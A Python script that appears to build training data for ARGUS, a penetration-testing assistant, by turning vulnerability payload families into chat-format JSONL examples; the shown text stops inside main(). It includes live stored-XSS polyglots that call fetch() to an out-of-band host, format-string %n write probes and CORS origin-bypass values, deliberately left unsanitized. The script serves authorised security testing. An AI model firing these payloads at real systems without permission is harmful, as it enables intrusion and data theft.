"""
ARGUS WhiteRabbitNeo Training Data — Payload Examples Augmentor

Generates additional payload generation training examples by creating
variations across different target types, contexts, and CWE mappings.
Creates 10+ examples per family (540+ total) to meet minimum targets.

No sanitization — all real payload templates preserved as-is.

Usage:
    python scripts/training/augment_payloads.py --payloads-dir backend/config/payloads --output training_data/payload_augmented.jsonl
"""

import argparse
import json
import random
import sys
from pathlib import Path
from typing import Optional

import yaml


SYSTEM_PROMPT_PAYLOAD_GEN = "You are ARGUS Payload Generator. You generate concrete payload variants for ARGUS payload families covering all 54 families (safe, offensive, and approval-gated). Given a vulnerability type, context, and target, you output the family_id, seed payloads with techniques, encoding pipeline, parameters needed, risk level, and whether approval is required. Output strict JSON only."

SYSTEM_PROMPT_FAMILY_SEL = "You are ARGUS Payload Family Selector. Given a vulnerability description, evidence, and context, you select the appropriate ARGUS payload family, determine risk level, approval requirements, OAST needs, and validation strategy. You cover all 54 payload families including offensive variants. Output strict JSON only."

SYSTEM_PROMPT_VALIDATION = "You are ARGUS Planner Agent. Given a finding description, vulnerability type, and target context, you generate a ValidationPlanV1: select the correct ARGUS payload family, tool, and validation strategy. You cover all 54 payload families. Output strict JSON matching ValidationPlanV1 schema."

SYSTEM_PROMPT_REMEDIATION = "You are ARGUS Remediation Advisor. Given a finding with vulnerability type, severity, affected asset, and evidence, you produce prioritized remediation steps with verification commands. You include defense-in-depth recommendations. Output strict JSON only."


TARGET_TYPES = [
    "web application login form",
    "REST API endpoint",
    "search parameter on e-commerce platform",
    "user profile update field",
    "file upload endpoint",
    "JSON API POST endpoint",
    "GraphQL mutation endpoint",
    "admin dashboard parameter",
    "mobile API authentication endpoint",
    "internal microservice endpoint",
    "WordPress site",
    "Node.js Express application",
    "Java Spring Boot application",
    "Python Flask/Django application",
    "PHP Laravel application",
    "ASP.NET application",
    "Ruby on Rails application",
    "cloud-hosted SaaS platform",
    "Kubernetes ingress endpoint",
    "legacy application with outdated stack",
]

CONTEXT_VARIATIONS = {
    "sqli": [
        "Authentication bypass via SQL injection in login form. Application uses MySQL backend with direct query construction.",
        "Union-based SQL injection in product search. Application uses PostgreSQL with parameterized queries on most endpoints except legacy search.",
        "Blind SQL injection in user ID parameter. Application uses SQLite for session storage.",
        "Error-based SQL injection disclosed database version information. Microsoft SQL Server backend.",
        "SQL injection in cookie-based session token. Application decrypts and uses value directly in query.",
    ],
    "xss": [
        "Reflected XSS in search parameter. Input reflected in HTML context without encoding.",
        "Reflected XSS in error message. Input reflected inside JavaScript string literal.",
        "DOM-based XSS in URL fragment. Application uses location.hash in eval() context.",
        "Stored XSS in user bio field. Input stored in database and rendered on profile pages.",
        "XSS in SVG file upload. Uploaded SVG rendered inline with script execution capability.",
    ],
    "ssrf": [
        "SSRF in image URL parameter. Application fetches and processes remote images.",
        "SSRF in webhook URL configuration. Application sends HTTP requests to user-specified URLs.",
        "SSRF in PDF generator. Server-side document rendering fetches remote resources.",
        "SSRF in import function. Application imports data from user-provided URLs.",
        "Blind SSRF in health check endpoint. Application makes outbound requests to verify service availability.",
    ],
    "rce": [
        "Command injection in ping diagnostic tool. Application passes IP parameter directly to system().",
        "Command injection in file path parameter. Application uses user input in os.system() call.",
        "Command injection in backup script. Cron job uses user-provided filename in shell command.",
        "RCE via template injection leading to command execution. Jinja2 SSTI with sandbox escape.",
        "RCE via deserialization. Java application deserializes untrusted input with commons-collections gadget chain.",
    ],
    "lfi_rfi": [
        "Local file inclusion in file download parameter. Application uses user input directly in file path.",
        "Path traversal in profile picture endpoint. Image path not properly sanitized.",
        "LFI via PHP filter wrapper. Application allows php://filter for file reading.",
        "RFI in template include. Application dynamically includes files from user-specified paths.",
        "Path traversal in log file viewer. Admin panel allows viewing arbitrary files.",
    ],
    "xxe": [
        "XXE in XML file upload. Application parses XML without disabling external entities.",
        "XXE in SOAP API endpoint. XML body processed with default parser settings.",
        "Blind XXE in RSS feed import. Application fetches and parses external RSS feeds.",
        "XXE in SAML assertion processing. SAML response parsed without entity restrictions.",
        "XXE OAST via DNS callback. Application processes XML with external DTD loading enabled.",
    ],
    "ssti": [
        "SSTI in Jinja2 template engine. User input rendered in {{ }} context.",
        "SSTI in Twig template. Email template editor allows user-controlled expressions.",
        "SSTI in Freemarker template. PDF generation uses user input in template context.",
        "SSTI in ERB template. Ruby application renders user-controlled ERB content.",
        "SSTI in Thymeleaf template. Spring Boot application processes user input in template expressions.",
    ],
    "auth_bypass": [
        "Authentication bypass via JWT none algorithm. Application accepts 'none' algorithm in JWT header.",
        "Authentication bypass via forced browsing. Admin endpoint lacks proper authorization check.",
        "Authentication bypass via SQL injection in login. Application constructs auth query from user input.",
        "Authentication bypass via password reset token predictability. Reset tokens use sequential or time-based values.",
        "Authentication bypass via LDAP injection. Application constructs LDAP query from user input.",
    ],
    "idor": [
        "IDOR in user profile API. Changing user ID in /api/users/{id} reveals other users data.",
        "IDOR in order history. User can view other orders by changing order ID parameter.",
        "IDOR in document download. Sequential document IDs allow access to other users files.",
        "IDOR in account settings. Changing account UUID in request grants access to other accounts.",
        "IDOR in messaging API. User can read other users messages by modifying message ID.",
    ],
    "nosqli": [
        "NoSQL injection in MongoDB login. Application uses $ne operator in query construction.",
        "NoSQL injection in search endpoint. Application passes user JSON directly to MongoDB find().",
        "NoSQL injection in user registration. Application uses $where operator from user input.",
        "NoSQL injection in session handling. Session deserialization allows $gt operator injection.",
        "Blind NoSQL injection in product filter. Application uses user input in MongoDB aggregate().",
    ],
    "jwt": [
        "JWT none algorithm attack. Application verifies signature but accepts alg='none'.",
        "JWT algorithm confusion. RS256 public key used as HMAC secret for HS256 verification.",
        "JWT secret weak key. Token signed with easily brute-forceable secret key.",
        "JWT user manipulation. User role stored in JWT payload without server-side verification.",
        "JWT signature bypass via empty signature. Application accepts tokens with empty signature.",
    ],
    "deserialization": [
        "Java deserialization with commons-collections gadget chain. Application uses insecure ObjectInputStream.",
        "Python pickle deserialization in session cookie. Application deserializes user-controlled data.",
        "PHP deserialization via magic methods. Application uses unserialize() on user input.",
        "Node.js deserialization via node-serialize. Application deserializes untrusted cookie values.",
        "Ruby YAML deserialization. Application loads user-controlled YAML with unsafe load.",
    ],
    "race_condition": [
        "Race condition in coupon redemption. Multiple concurrent requests bypass single-use validation.",
        "Race condition in balance transfer. Simultaneous transfers exploit check-then-act timing.",
        "Race condition in voting system. Multiple vote submissions processed before counter increment.",
        "Race condition in file upload. Concurrent uploads bypass file type validation.",
        "Race condition in email verification. Reuse of verification token across accounts.",
    ],
    "graphql": [
        "GraphQL introspection query leak. Full schema exposed via __schema query.",
        "GraphQL query depth abuse. Deeply nested queries cause DoS.",
        "GraphQL batch query attack. Multiple operations in single request bypass rate limiting.",
        "GraphQL IDOR in mutation. Changing ID in mutation parameter accesses other users data.",
        "GraphQL field suggestion information disclosure. Error messages reveal field names.",
    ],
    "cors_misconfig": [
        "CORS misconfiguration allowing arbitrary origin. Access-Control-Allow-Origin reflects request Origin header.",
        "CORS with null origin allowed. Application allows null origin in CORS policy.",
        "CORS with subdomain wildcard. *.example.com allows subdomain takeover via CORS.",
        "CORS with credential exposure. Access-Control-Allow-Credentials: true with wildcard origin.",
        "CORS preflight bypass. Application does not validate preflight request method/headers.",
    ],
    "http_smuggling": [
        "HTTP request smuggling via CL.TE discrepancy. Frontend uses Content-Length, backend uses Transfer-Encoding.",
        "HTTP smuggling via TE.CL discrepancy. Frontend uses Transfer-Encoding, backend uses Content-Length.",
        "HTTP smuggling via double Transfer-Encoding. Obfuscation causes frontend/backend to parse differently.",
        "HTTP smuggling for web cache poisoning. Smuggled request poisons cached response.",
        "HTTP smuggling for session hijacking. Smuggled request captures another users session.",
    ],
    "cache_poisoning": [
        "Web cache poisoning via unkeyed header. X-Forwarded-Host reflected in cached response.",
        "Cache poisoning via parameter cloaking. Semicolon-delimited parameter bypasses cache key normalization.",
        "Cache poisoning via HTTP method override. X-Method-Override header influences cached response.",
        "Cache deception via path confusion. Application caches /profile;.css as CSS but serves user data.",
        "Cache poisoning via fat GET. Query string parameters not included in cache key.",
    ],
    "prototype_pollution": [
        "Prototype pollution via JSON merge. Application uses deepMerge on user-controlled JSON without sanitization.",
        "Prototype pollution via __proto__ in query string. Application parses query string with qs library.",
        "Prototype pollution via constructor manipulation. User input sets constructor.prototype properties.",
        "Client-side prototype pollution in JavaScript. Polluted Object.prototype affects DOM element creation.",
        "Server-side prototype pollution. Polluted Object.prototype affects server-side code paths.",
    ],
    "mass_assignment": [
        "Mass assignment in user registration. POST /api/users accepts role: 'admin' parameter.",
        "Mass assignment in profile update. PUT /api/profile allows setting is_admin: true.",
        "Mass assignment in password change. Changing email without requiring current password.",
        "Mass assignment via nested JSON. User object accepts {role: 'admin', verified: true} nested fields.",
        "Mass assignment in API update endpoint. PATCH /api/orders/{id} allows changing price field.",
    ],
}

REMEDIATION_MAP = {
    "sqli": {"actions": ["Use parameterized queries / prepared statements", "Implement input validation with allowlist", "Apply least-privilege database accounts", "Deploy WAF with SQLi detection rules"], "verify": "Re-run sqlmap_safe and verify no injection is possible"},
    "xss": {"actions": ["Implement context-aware output encoding", "Deploy Content Security Policy headers", "Add input sanitization for HTML context", "Enable HttpOnly and Secure flags on cookies"], "verify": "Re-run dalfox with canary payload and verify no reflection"},
    "ssrf": {"actions": ["Implement URL allowlist for outbound requests", "Block internal network ranges (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16)", "Disable unnecessary URL schemes (file://, gopher://)", "Use DNS rebinding protection"], "verify": "Re-run ffuf_param with SSRF payloads and verify no internal access"},
    "rce": {"actions": ["Remove OS command execution from application logic", "Implement strict input validation (allowlist)", "Run application with minimal privileges", "Apply container security profiles (seccomp, AppArmor)"], "verify": "Re-run commix and verify no command execution is possible"},
    "lfi_rfi": {"actions": ["Implement path validation (basename check, chroot)", "Use allowlist for permitted file paths", "Disable PHP wrapper protocols (php://filter)", "Set open_basedir in PHP configuration"], "verify": "Re-run ffuf_dir with traversal payloads and verify no file access"},
    "xxe": {"actions": ["Disable external entity processing in XML parser", "Disable DTD processing", "Use JSON instead of XML where possible", "Implement XML input validation"], "verify": "Re-run nuclei with XXE templates and verify no entity processing"},
    "ssti": {"actions": ["Use sandboxed template rendering", "Never render user input directly in templates", "Implement input sanitization for template characters", "Use template engines with auto-escaping enabled"], "verify": "Re-run tplmap and verify no template injection is possible"},
    "auth_bypass": {"actions": ["Implement proper authentication middleware", "Validate JWT signatures server-side", "Use constant-time comparison for auth tokens", "Enforce authorization checks on all endpoints"], "verify": "Manual authentication bypass testing with nuclei JWT templates"},
    "idor": {"actions": ["Implement server-side authorization checks", "Use UUIDs instead of sequential IDs", "Validate that user owns requested resource", "Apply row-level security in database"], "verify": "Manual IDOR testing with modified ID parameters"},
    "nosqli": {"actions": ["Use MongoDB query operators with explicit type checks", "Implement input validation for MongoDB operators", "Use projection to limit returned fields", "Apply query sanitization"], "verify": "Re-run nosqlmap and verify no injection is possible"},
    "jwt": {"actions": ["Never accept 'none' algorithm", "Use RS256/ES256 instead of HS256 when possible", "Use strong signing keys (256+ bits)", "Validate all JWT claims server-side"], "verify": "Run jwt_tool and verify none-alg and key confusion are rejected"},
    "deserialization": {"actions": ["Never deserialize untrusted data", "Use JSON instead of binary serialization", "Implement type filtering for deserialization", "Apply integrity checks (HMAC) on serialized data"], "verify": "Manual testing with deserialization payloads"},
    "race_condition": {"actions": ["Implement database-level transaction locks", "Use atomic operations for critical actions", "Add request deduplication", "Implement idempotency keys"], "verify": "Re-test with concurrent requests and verify single-use constraints hold"},
    "graphql": {"actions": ["Disable introspection in production", "Implement query depth limiting", "Add query complexity analysis", "Implement rate limiting per field"], "verify": "Re-run graphql_cop and verify introspection is disabled"},
    "cors_misconfig": {"actions": ["Set explicit allowed origins (not wildcard with credentials)", "Remove null origin from CORS policy", "Validate Origin against allowlist server-side", "Set proper Access-Control-Allow-Methods"], "verify": "Verify CORS headers only allow trusted origins with curl"},
    "http_smuggling": {"actions": ["Disable Transfer-Encoding or normalize header handling", "Reject HTTP/1.1 requests with both Content-Length and Transfer-Encoding", "Configure frontend and backend to use same parser", "Implement request validation before forwarding"], "verify": "Re-test with HTTP smuggling payloads and verify proper header handling"},
    "cache_poisoning": {"actions": ["Remove unkeyed headers from cache key", "Set proper Vary headers", "Implement cache key normalization", "Disable caching for authenticated responses"], "verify": "Verify cached responses do not contain user-specific data"},
    "prototype_pollution": {"actions": ["Use Object.create(null) for clean objects", "Implement deep merge sanitization", "Freeze Object.prototype", "Use Map instead of plain objects for user data"], "verify": "Re-test with prototype pollution payloads and verify Object.prototype is not modified"},
    "mass_assignment": {"actions": ["Implement explicit field allowlists for user input", "Use DTOs for input validation", "Reject unknown properties in API requests", "Apply server-side field-level authorization"], "verify": "Verify API rejects unknown/privileged fields in requests"},
}


MISSING_FAMILIES = {
    "cors_misconfig": {
        "family_id": "cors_misconfig", "description": "CORS misconfiguration probes. Origin: null, attacker.com, sub.target.com, and Access-Control-Allow-Credentials bypass vectors.",
        "cwe_ids": [942], "owasp_top10": ["A01:2021", "A05:2021"], "risk_level": "medium", "requires_approval": False, "oast_required": True,
        "payloads": [
            {"id": "origin_null", "template": "null", "confidence": "suspected", "notes": "Origin: null header probe"},
            {"id": "origin_attacker", "template": "https://{oast_host}", "confidence": "suspected", "notes": "Attacker-controlled Origin header"},
            {"id": "origin_sub_target", "template": "https://{canary}.{target_domain}", "confidence": "suspected", "notes": "Subdomain Origin prefix-matching bypass"},
            {"id": "creds_bypass_origin", "template": "https://{target_domain}.{oast_host}", "confidence": "suspected", "notes": "Suffix-matching Origin bypass"},
        ],
        "mutations": [{"name": "mixed_scheme", "description": "Swap Origin between http:// and https://"}],
        "encodings": [{"name": "identity", "stages": [], "description": "Raw Origin header value"}],
    },
    "format_string": {
        "family_id": "format_string", "description": "Format string attack probes (CWE-134). %x %n %s read/write probes and positional argument tests.",
        "cwe_ids": [134], "owasp_top10": ["A06:2021"], "risk_level": "high", "requires_approval": False, "oast_required": False,
        "payloads": [
            {"id": "fmt_read_stack", "template": "%x.%x.%x.%x.%x.%x.%x.%x", "confidence": "suspected", "notes": "Stack read via hex dump"},
            {"id": "fmt_n_write", "template": "%100d%7$n", "confidence": "suspected", "notes": "%n write probe at stack offset 7"},
            {"id": "fmt_string_read", "template": "%s%s%s%s%s%s%s%s", "confidence": "suspected", "notes": "%s dereference read probe"},
            {"id": "fmt_positional_read", "template": "%1$p %2$p %3$p %4$p %5$p %6$p", "confidence": "suspected", "notes": "Positional argument pointer leak"},
        ],
        "mutations": [{"name": "width_increment", "description": "Scale %d width up to 65000+"}],
        "encodings": [{"name": "identity", "stages": [], "description": "Raw format string"}, {"name": "url_only", "stages": ["url"], "description": "URL-encoded format string"}],
    },
    "xss_stored": {
        "family_id": "xss_stored", "description": "Stored XSS payloads with polyglot markers. Includes img/onerror, svg/onload, details/ontoggle, and script src=data vectors.",
        "cwe_ids": [79], "owasp_top10": ["A03:2021"], "risk_level": "medium", "requires_approval": False, "oast_required": True,
        "payloads": [
            {"id": "img_onerror_polyglot", "template": ">'>\"><img src=x onerror=fetch('//{oast_host}/{canary}')>", "confidence": "suspected", "notes": "Three-context polyglot break-out with fetch OAST"},
            {"id": "svg_onload_polyglot", "template": "><svg/onload=fetch('//{oast_host}/{canary}')>", "confidence": "suspected", "notes": "SVG onload handler"},
            {"id": "details_ontoggle", "template": "<details open ontoggle=fetch('//{oast_host}/{canary}')>", "confidence": "suspected", "notes": "details/ontoggle event handler"},
            {"id": "data_script_src", "template": "<script src=data:text/javascript,fetch('//{oast_host}/{canary}')></script>", "confidence": "suspected", "notes": "Script src=data: URI inline fetch"},
        ],
        "mutations": [{"name": "event_handler_swap", "description": "Rotate through onmouseover, onfocus, onanimationstart handlers"}],
        "encodings": [{"name": "identity", "stages": [], "description": "Raw stored XSS payload"}, {"name": "url_only", "stages": ["url"], "description": "URL-encoded for form submission"}, {"name": "html_entity", "stages": ["html"], "description": "HTML-entity encoded for double-decoding"}],
    },
}


def load_payload_descriptors(payloads_dir: Path) -> list[dict]:
    loaded = []
    loaded_ids = set()
    for f in sorted(payloads_dir.glob("*.yaml")):
        try:
            with open(f, encoding="utf-8") as fh:
                data = yaml.safe_load(fh)
            if data and "family_id" in data:
                data["_source_file"] = f.name
                loaded.append(data)
                loaded_ids.add(data["family_id"])
        except Exception:
            pass
    for fid, fdata in MISSING_FAMILIES.items():
        if fid not in loaded_ids:
            fdata_copy = dict(fdata)
            fdata_copy["_source_file"] = f"{fid}_manual.yaml"
            loaded.append(fdata_copy)
            loaded_ids.add(fid)
    return loaded


def generate_payload_variations(payload: dict, variation_idx: int) -> Optional[dict]:
    family_id = payload.get("family_id", "")
    cwe_ids = payload.get("cwe_ids", [])
    owasp = payload.get("owasp_top10", [])
    risk_level = payload.get("risk_level", "low")
    requires_approval = payload.get("requires_approval", False)
    oast_required = payload.get("oast_required", False)
    seeds = payload.get("payloads", [])
    encodings = payload.get("encodings", [])
    description = payload.get("description", "")

    target_type = TARGET_TYPES[variation_idx % len(TARGET_TYPES)]
    contexts = CONTEXT_VARIATIONS.get(family_id, CONTEXT_VARIATIONS.get(
        family_id.replace("_safe", "").replace("_dom", "").replace("_stored", "").replace("_contextual", ""),
        [f"{family_id} vulnerability in {target_type}"]
    ))
    context = contexts[variation_idx % len(contexts)]

    is_safe = family_id.endswith("_safe")
    phase = "vuln_analysis" if is_safe else "exploitation"

    seeds_output = []
    for s in seeds:
        seeds_output.append({
            "id": s.get("id", ""),
            "template": s.get("template", ""),
            "confidence": s.get("confidence", "suspected"),
            "technique": s.get("notes", ""),
        })

    encoding_names = [e.get("name", "identity") for e in encodings] if encodings else ["identity"]

    user_content = (
        f"Generate payload seeds for the '{family_id}' family targeting a {context}\n\n"
        f"Target type: {target_type}\n"
        f"CWE: {cwe_ids}\n"
        f"OWASP: {owasp}"
    )

    assistant_content = json.dumps({
        "family_id": family_id,
        "seeds": seeds_output,
        "encoding_pipeline": encoding_names[0] if len(encoding_names) == 1 else "url_only",
        "parameters_needed": ["url", "param"] + ["canary"] if oast_required else ["url", "param"],
        "risk_level": risk_level,
        "requires_approval": requires_approval,
        "oast_required": oast_required,
        "cwe_ids": cwe_ids if isinstance(cwe_ids, list) else [],
        "owasp": owasp if isinstance(owasp, list) else [],
        "rationale": description[:300] if description else f"{family_id} payload family targeting {context[:100]}.",
    }, ensure_ascii=False)

    return {
        "messages": [
            {"role": "system", "content": SYSTEM_PROMPT_PAYLOAD_GEN},
            {"role": "user", "content": user_content},
            {"role": "assistant", "content": assistant_content},
        ],
        "metadata": {
            "task": "payload_generation",
            "source": "argus_payload_registry",
            "license": "internal",
            "argus_phase": phase,
            "argus_tool_ids": [],
            "argus_payload_families": [family_id],
            "cwe_ids": cwe_ids if isinstance(cwe_ids, list) else [],
        },
    }


def generate_family_sel_variation(payload: dict, variation_idx: int) -> Optional[dict]:
    family_id = payload.get("family_id", "")
    cwe_ids = payload.get("cwe_ids", [])
    owasp = payload.get("owasp_top10", [])
    risk_level = payload.get("risk_level", "low")
    requires_approval = payload.get("requires_approval", False)
    oast_required = payload.get("oast_required", False)
    seeds = payload.get("payloads", [])
    description = payload.get("description", "")

    target_type = TARGET_TYPES[variation_idx % len(TARGET_TYPES)]
    contexts = CONTEXT_VARIATIONS.get(family_id, CONTEXT_VARIATIONS.get(
        family_id.replace("_safe", "").replace("_dom", "").replace("_stored", "").replace("_contextual", ""),
        [f"{family_id} vulnerability in {target_type}"]
    ))
    context = contexts[variation_idx % len(contexts)]

    family_base = family_id.replace("_safe", "").replace("_dom", "").replace("_stored", "").replace("_contextual", "")
    if family_base == "xss":
        alt_families = ["xss", "xss_dom", "xss_stored", "xss_contextual"]
    elif family_base == "sqli":
        alt_families = ["sqli", "sqli_safe"]
    elif family_base == "ssrf":
        alt_families = ["ssrf", "ssrf_oast_safe"]
    elif family_base == "jwt":
        alt_families = ["jwt", "jwt_none_alg", "jwt_safe"]
    elif family_base == "xxe":
        alt_families = ["xxe", "xxe_oast_safe"]
    elif family_base == "crlf":
        alt_families = ["crlf", "crlf_safe"]
    elif family_base == "ssti":
        alt_families = ["ssti", "ssti_safe"]
    elif family_base == "ldapi" or family_base == "ldap_injection":
        alt_families = ["ldapi", "ldapi_safe", "ldap_injection"]
    elif family_base == "xpath":
        alt_families = ["xpath_injection", "xpathi_safe"]
    else:
        alt_families = [family_id]

    strategy_map = {
        "xss": "browser_canary_oast", "sqli": "database_canary_oast", "ssrf": "oast_callback",
        "rce": "oast_callback", "xxe": "oast_callback", "ssti": "template_render_canary",
        "nosqli": "database_canary", "lfi_rfi": "file_read_verification", "auth_bypass": "auth_bypass_verification",
        "idor": "id_enumeration_verification", "jwt": "token_manipulation_verification",
        "deserialization": "oast_callback", "graphql": "introspection_verification",
        "cors_misconfig": "origin_verification", "http_smuggling": "timing_verification",
        "cache_poisoning": "cache_verification", "race_condition": "concurrency_verification",
        "prototype_pollution": "prototype_verification", "mass_assignment": "field_verification",
    }
    strategy = strategy_map.get(family_base, "reflection_verification") if oast_required else strategy_map.get(family_base, "reflection_verification")

    evidence_variants = [
        f"Tool output confirms {family_id} vulnerability with clear evidence",
        f"Suspected {family_id} based on anomalous response behavior",
        f"Parameter reflection detected, {family_id} likely",
        f"OAST callback received confirming {family_id}",
        f"Error message disclosure suggests {family_id} possibility",
    ]
    evidence = evidence_variants[variation_idx % len(evidence_variants)]

    user_content = (
        f"Finding: {context}\n"
        f"Vulnerability type: {family_id}\n"
        f"Evidence: {evidence}\n"
        f"Target: {target_type}"
    )

    assistant_content = json.dumps({
        "family_id": family_id,
        "alternative_families": [f for f in alt_families if f != family_id],
        "risk_level": risk_level,
        "approval_required": requires_approval,
        "oast_required": oast_required,
        "cwe_ids": cwe_ids if isinstance(cwe_ids, list) else [],
        "owasp": owasp if isinstance(owasp, list) else [],
        "validation_strategy": strategy,
        "payload_count": len(seeds),
        "rationale": description[:200] if description else f"Primary: {family_id} for {context[:100]}.",
    }, ensure_ascii=False)

    return {
        "messages": [
            {"role": "system", "content": SYSTEM_PROMPT_FAMILY_SEL},
            {"role": "user", "content": user_content},
            {"role": "assistant", "content": assistant_content},
        ],
        "metadata": {
            "task": "payload_family_selection",
            "source": "argus_payload_registry",
            "license": "internal",
            "argus_phase": "vuln_analysis",
            "argus_tool_ids": [],
            "argus_payload_families": [family_id],
            "cwe_ids": cwe_ids if isinstance(cwe_ids, list) else [],
        },
    }


def generate_validation_variation(payload: dict, variation_idx: int) -> Optional[dict]:
    family_id = payload.get("family_id", "")
    cwe_ids = payload.get("cwe_ids", [])
    risk_level = payload.get("risk_level", "low")
    requires_approval = payload.get("requires_approval", False)
    oast_required = payload.get("oast_required", False)
    seeds = payload.get("payloads", [])

    target_type = TARGET_TYPES[variation_idx % len(TARGET_TYPES)]
    contexts = CONTEXT_VARIATIONS.get(family_id, CONTEXT_VARIATIONS.get(
        family_id.replace("_safe", "").replace("_dom", "").replace("_stored", "").replace("_contextual", ""),
        [f"{family_id} vulnerability in {target_type}"]
    ))
    context = contexts[variation_idx % len(contexts)]

    tool_map = {
        "sqli": "sqlmap_safe", "sqli_safe": "sqlmap_safe", "xss": "dalfox", "xss_dom": "dalfox",
        "xss_stored": "dalfox", "xss_contextual": "dalfox", "ssrf": "ffuf_param", "ssrf_oast_safe": "ffuf_param",
        "rce": "commix", "command_injection_safe": "commix", "lfi_rfi": "ffuf_dir", "path_traversal": "ffuf_dir",
        "xxe": "nuclei", "xxe_oast_safe": "nuclei", "ssti": "tplmap", "ssti_safe": "tplmap",
        "nosqli": "nosqlmap", "nosqli_safe": "nosqlmap", "graphql": "graphql_cop", "graphql_safe": "graphw00f",
        "jwt": "jwt_tool", "jwt_none_alg": "jwt_tool", "jwt_safe": "jwt_tool", "auth_bypass": "nuclei",
        "idor": "ffuf_param", "cors_misconfig": "cors_probe", "csrf_safe": "nuclei", "csrf_token_bypass": "nuclei",
        "deserialization": "nuclei", "http_smuggling": "nuclei", "proto_smuggle": "nuclei",
        "cache_poisoning": "nuclei", "race_condition": "nuclei",
        "ldap_injection": "ldapsearch", "ldapi": "ldapsearch", "ldapi_safe": "ldapsearch",
        "xpath_injection": "nuclei", "xpathi_safe": "nuclei",
        "open_redirect": "ffuf_param", "open_redirect_safe": "ffuf_param",
        "mass_assignment": "nuclei", "mass_assignment_safe": "nuclei",
        "prototype_pollution": "nuclei", "prototype_pollution_safe": "nuclei",
        "type_juggling": "nuclei", "buffer_overflow": "nuclei", "format_string": "nuclei", "integer_overflow": "nuclei",
        "smtp_injection": "nuclei", "crlf": "nuclei", "crlf_safe": "nuclei",
        "traversal_safe": "ffuf_dir", "oauth": "nuclei", "oauth_misconfig": "nuclei",
    }
    tool_id = tool_map.get(family_id, "nuclei")

    strategy_map = {
        "oast_callback": ["1. Send canary payload via {tool_id}", "2. Check OAST callback for DNS/HTTP interaction", "3. Verify exploit execution"],
        "browser_canary_oast": ["1. Send canary payload via {tool_id}", "2. Check OAST callback for interaction", "3. Verify XSS execution in browser context"],
        "database_canary": ["1. Inject canary payload via {tool_id}", "2. Observe differential response", "3. Extract data via UNION or error-based technique"],
        "reflection_verification": ["1. Submit canary payload via {tool_id}", "2. Check response body for canary reflection", "3. Verify parameter influence"],
    }

    if oast_required:
        strategy = "oast_callback"
    elif family_id.startswith("xss") and not family_id.endswith("_safe"):
        strategy = "browser_canary_oast"
    elif family_id in ("sqli", "nosqli") and not family_id.endswith("_safe"):
        strategy = "database_canary"
    else:
        strategy = "reflection_verification"

    steps = [s.replace("{tool_id}", tool_id) for s in strategy_map.get(strategy, strategy_map["reflection_verification"])]

    user_content = (
        f"Finding: {context}\n"
        f"Vulnerability type: {family_id}\n"
        f"Severity: {risk_level}\n"
        f"Target: {target_type}\n"
        f"Evidence: Tool output indicates potential {family_id} vulnerability"
    )

    assistant_content = json.dumps({
        "plan_id": f"vp-{family_id}-{variation_idx}",
        "family_id": family_id,
        "tool_id": tool_id,
        "validation_strategy": strategy,
        "hypothesis": f"{context[:80]} confirmed via {strategy}",
        "approval_required": requires_approval,
        "payloads": [s.get("template", "") for s in seeds[:3]],
        "verification_steps": steps,
    }, ensure_ascii=False)

    return {
        "messages": [
            {"role": "system", "content": SYSTEM_PROMPT_VALIDATION},
            {"role": "user", "content": user_content},
            {"role": "assistant", "content": assistant_content},
        ],
        "metadata": {
            "task": "validation_plan",
            "source": "argus_payload_registry",
            "license": "internal",
            "argus_phase": "vuln_analysis",
            "argus_tool_ids": [tool_id],
            "argus_payload_families": [family_id],
            "cwe_ids": cwe_ids if isinstance(cwe_ids, list) else [],
        },
    }


def generate_remediation_variation(payload: dict, variation_idx: int) -> Optional[dict]:
    family_id = payload.get("family_id", "")
    cwe_ids = payload.get("cwe_ids", [])
    risk_level = payload.get("risk_level", "low")

    target_type = TARGET_TYPES[variation_idx % len(TARGET_TYPES)]
    family_base = family_id.replace("_safe", "").replace("_dom", "").replace("_stored", "").replace("_contextual", "")
    rem_data = REMEDIATION_MAP.get(family_base, {
        "actions": ["Implement input validation and sanitization", "Apply defense-in-depth security controls", "Update affected components"],
        "verify": f"Re-run {family_id} payload family and verify no vulnerability remains",
    })

    contexts = CONTEXT_VARIATIONS.get(family_base, [f"{family_id} vulnerability"])
    context = contexts[variation_idx % len(contexts)]

    cwe_str = ", ".join(f"CWE-{c}" for c in (cwe_ids if isinstance(cwe_ids, list) else []))

    severity_variants = ["low", "medium", "medium", "high", "critical"]
    severity = severity_variants[variation_idx % len(severity_variants)]
    if risk_level == "critical":
        severity = "critical"

    user_content = (
        f"Finding: {context[:100]}\n"
        f"Severity: {severity}\n"
        f"CWE: {cwe_str}\n"
        f"Affected asset: {target_type}\n"
        f"Evidence: Tool output confirms {family_id} vulnerability"
    )

    steps = []
    for i, action in enumerate(rem_data["actions"]):
        steps.append({"order": i + 1, "action": action, "detail": f"Apply {action.lower()} for {family_base}"})

    assistant_content = json.dumps({
        "title": f"{family_base.replace('_', ' ').title()} in {target_type.split()[0]} application",
        "severity": severity,
        "remediation_steps": steps,
        "verification": rem_data["verify"],
    }, ensure_ascii=False)

    return {
        "messages": [
            {"role": "system", "content": SYSTEM_PROMPT_REMEDIATION},
            {"role": "user", "content": user_content},
            {"role": "assistant", "content": assistant_content},
        ],
        "metadata": {
            "task": "finding_to_remediation",
            "source": "argus_payload_registry",
            "license": "internal",
            "argus_phase": "post_exploitation",
            "argus_tool_ids": [],
            "argus_payload_families": [family_id],
            "cwe_ids": cwe_ids if isinstance(cwe_ids, list) else [],
        },
    }


def main():
    parser = argparse.ArgumentParser(description="Augment payload training examples for all 54 families")
    parser.add_argument("--payloads-dir", type=str, default="backend/config/payloads", help="Path to ARGUS payload YAML directory")
    parser.add_argument("--variations", type=int, default=10, help="Number of variations per family (default: 10)")
    parser.add_argument("--output", type=str, default="training_data/payload_augmented.jsonl", help="Output JSONL file")
    parser.add_argument("--seed", type=int, default=42, help="Random seed for variations")
    args = parser.parse_args()

    random.seed(args.seed)

    payloads_dir = Path(args.payloads_dir)
    output_path = Path(args.output)
    output_path.parent.mkdir(parents=True, exist_ok=True)

    try:
        import yaml
    except ImportError:
        print("[error] PyYAML is required. Install with: pip install pyyaml")
        sys.exit(1)

    print("[1/4] Loading payload descriptors...")
    payloads = load_payload_descriptors(payloads_dir)
    print(f"  Loaded {len(payloads)} payload descriptors")

    records = []

    print("[2/4] Generating payload_generation variations...")
    for payload in payloads:
        for v in range(args.variations):
            rec = generate_payload_variations(payload, v)
            if rec:
                records.append(rec)

    print("[3/4] Generating payload_family_selection, validation_plan, and remediation variations...")
    for payload in payloads:
        for v in range(max(3, args.variations // 2)):
            rec = generate_family_sel_variation(payload, v)
            if rec:
